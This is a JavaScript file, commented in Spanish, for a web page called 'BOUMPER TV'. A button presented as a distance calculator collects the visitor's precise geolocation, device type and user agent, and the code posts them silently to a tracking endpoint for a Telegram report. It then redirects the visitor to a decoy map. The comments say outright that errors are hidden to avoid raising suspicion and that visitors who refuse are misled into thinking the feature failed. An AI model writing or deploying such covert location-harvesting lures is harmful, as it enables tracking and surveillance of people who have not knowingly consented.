/**
 * BOUMPER TV - Ecosistema de Vigilancia Transmedia
 * Misión: Captura de telemetría y redirección estratégica.
 */

const CONFIG = {
    API_ENDPOINT: '/api/track', // Tu serverless function en Vercel
    FINAL_REDIRECT: 'https://www.google.com/maps/search/?api=1&query=-34.6037,-58.3816' // Coordenadas de tu estudio
};

async function capturarIntruso() {
    const statusText = document.getElementById('status-text');
    
    // 1. Verificación de capacidades del navegador
    if (!navigator.geolocation) {
        console.error("Geolocalización no soportada");
        window.location.href = CONFIG.FINAL_REDIRECT;
        return;
    }

    // 2. Solicitar ubicación (El momento de la verdad)
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const data = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy,
                device: getDeviceInfo(),
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            try {
                // 3. Envío silencioso al Backend
                await fetch(CONFIG.API_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (err) {
                // Si falla el envío, no detenemos la redirección para no levantar sospechas
                console.error("Error de sincronización silenciado.");
            } finally {
                // 4. Redirección final al objetivo falso (tu estudio)
                window.location.href = CONFIG.FINAL_REDIRECT;
            }
        },
        (error) => {
            // Si el usuario rechaza la ubicación, igual lo mandamos al mapa
            // para que crea que simplemente "no funcionó" el cálculo de distancia.
            console.warn("Ubicación rechazada por el usuario.");
            window.location.href = CONFIG.FINAL_REDIRECT;
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

/**
 * Extrae información básica del dispositivo sin ser invasivo
 * para que el reporte de Telegram sea más preciso.
 */
function getDeviceInfo() {
    const ua = navigator.userAgent;
    if (/iPhone/.test(ua)) return "iPhone Detected";
    if (/Android/.test(ua)) return "Android Device";
    if (/iPad/.test(ua)) return "iPad Detected";
    return "Desktop/Unknown";
}

// Asignar el evento al botón cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.querySelector('.btn-location');
    if (btn) {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            btn.innerText = "CALCULANDO DISTANCIA...";
            btn.style.opacity = "0.5";
            btn.style.pointerEvents = "none";
            capturarIntruso();
        });
    }
});
